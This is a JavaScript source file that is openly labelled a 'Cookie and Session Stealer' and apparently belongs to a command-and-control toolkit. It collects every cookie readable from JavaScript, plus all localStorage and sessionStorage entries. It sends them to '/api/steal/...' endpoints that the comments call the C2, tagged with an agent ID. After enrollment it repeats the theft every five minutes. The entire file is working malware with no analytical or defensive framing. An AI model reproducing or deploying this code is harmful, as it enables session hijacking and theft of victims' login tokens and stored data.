/**
 * Cookie and Session Stealer
 * Extracts all cookies, localStorage, and sessionStorage
 */

async function stealAllCookies(agentId) {
    console.log('[Cookie Stealer] Starting cookie theft...');
    
    try {
        // Get all cookies
        const cookies = getAllCookies();
        
        if (cookies.length > 0) {
            console.log(`[Cookie Stealer] Found ${cookies.length} cookies`);
            
            // Send to C2
            const response = await fetch('/api/steal/cookies', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agent_id: agentId,
                    cookies: cookies
                })
            });
            
            if (response.ok) {
                console.log('[Cookie Stealer] ✅ Cookies sent to C2');
            } else {
                console.log('[Cookie Stealer] ❌ Failed to send cookies');
            }
        } else {
            console.log('[Cookie Stealer] No cookies found');
        }
        
    } catch (error) {
        console.error('[Cookie Stealer] Error:', error);
    }
}

async function stealAllStorage(agentId) {
    console.log('[Cookie Stealer] Starting storage theft...');
    
    try {
        // Get localStorage
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
        }
        
        // Get sessionStorage
        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
        }
        
        const totalItems = Object.keys(localStorageData).length + Object.keys(sessionStorageData).length;
        
        if (totalItems > 0) {
            console.log(`[Cookie Stealer] Found ${totalItems} storage items`);
            
            // Send to C2
            const response = await fetch('/api/steal/storage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agent_id: agentId,
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData
                })
            });
            
            if (response.ok) {
                console.log('[Cookie Stealer] ✅ Storage sent to C2');
            } else {
                console.log('[Cookie Stealer] ❌ Failed to send storage');
            }
        } else {
            console.log('[Cookie Stealer] No storage data found');
        }
        
    } catch (error) {
        console.error('[Cookie Stealer] Storage error:', error);
    }
}

function getAllCookies() {
    const cookies = [];
    const cookieString = document.cookie;
    
    if (!cookieString) {
        return cookies;
    }
    
    const cookiePairs = cookieString.split(';');
    
    for (const pair of cookiePairs) {
        const [name, value] = pair.trim().split('=');
        
        if (name && value) {
            cookies.push({
                domain: window.location.hostname,
                name: name,
                value: decodeURIComponent(value),
                path: '/',
                secure: window.location.protocol === 'https:',
                httpOnly: false,  // Can't access httpOnly cookies from JS
                sameSite: 'Lax'
            });
        }
    }
    
    return cookies;
}

/**
 * Auto-steal cookies and storage after enrollment
 */
async function startCookieStealing(agentId) {
    console.log('[Cookie Stealer] Initializing theft for agent:', agentId);
    
    // Initial theft
    await stealAllCookies(agentId);
    await stealAllStorage(agentId);
    
    // Periodic theft (every 5 minutes)
    setInterval(async () => {
        console.log('[Cookie Stealer] Periodic theft running...');
        await stealAllCookies(agentId);
        await stealAllStorage(agentId);
    }, 5 * 60 * 1000); // 5 minutes
}
